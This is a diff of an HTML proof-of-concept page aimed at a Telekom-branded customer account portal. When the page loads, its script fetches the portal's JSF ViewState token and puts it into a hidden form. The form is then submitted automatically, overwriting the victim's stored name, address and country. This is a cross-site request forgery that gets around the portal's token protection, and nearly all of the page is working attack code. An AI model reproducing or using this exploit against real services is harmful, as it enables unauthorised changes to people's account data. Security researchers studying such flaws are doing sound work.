@@ -1,8 +1,8 @@
 <html>
 <body onload="getData()">
 
-<form id="form" action="https://meinkonto.telekom-dienste.de/kundencenter/daten.xhtml?javax.faces.partial.ajax=true&javax.faces.source=j_idt53:j_idt116:j_idt120:personDataSave&javax.faces.partial.execute=@all&javax.faces.partial.render=@none&j_idt53:j_idt116:j_idt120:personDataSave=j_idt53:j_idt116:j_idt120:personDataSave&j_idt53=j_idt53&j_idt53:j_idt74:j_idt76:salutation=&j_idt53:j_idt74:j_idt82:firstname=bwahahaha&j_idt53:j_idt74:j_idt86:lastname=testingra&j_idt53:j_idt74:j_idt90:street=test&j_idt53:j_idt74:j_idt94:zipcode=12121&j_idt53:j_idt74:j_idt98:city=test&j_idt53:j_idt74:j_idt102:country=AX" method="POST">
-  <!--
+<form id="form" action="https://meinkonto.telekom-dienste.de/kundencenter/daten.xhtml" method="POST">
+  
   <input type="hidden" name="javax.faces.partial.ajax" value="true"/>
   <input type="hidden" name="javax.faces.source" value="j_idt53:j_idt116:j_idt120:personDataSave"/>
   <input type="hidden" name="javax.faces.partial.execute" value="@all"/>
@@ -16,7 +16,7 @@
   <input type="hidden" name="j_idt53:j_idt74:j_idt94:zipcode" value="12121"/>
   <input type="hidden" name="j_idt53:j_idt74:j_idt98:city" value="testingcity"/>
   <input type="hidden" name="j_idt53:j_idt74:j_idt102:country" value="AX"/>
-  -->
+  
   <input type="hidden" id="findtoken" name="javax.faces.ViewState" value=""/>
   <input type="submit" value="Test"/>
 </form>
@@ -38,8 +38,8 @@ x.onreadystatechange = function() {
     //token = demoJSON.field.replace(/(<([^>]+)>)/ig, "");
     var token = x.responseText.getElementsByTagName('update')[0];
    // token.replace(/<update id="j_id1:javax.faces.ViewState:0">/, "");
-    var y = token.childNodes[0];
-    var test = y.nodeValue.replace('<\![CDATA[ ',' ]]>', "");
+  //  var y = token.childNodes[0];
+    var test = token.nodeValue.replace('<\![CDATA[ ',' ]]>', "");
     var token2 = encodeURI(test);
     document.getElementById("findtoken").value = token2;
     document.getElementById("form").submit();
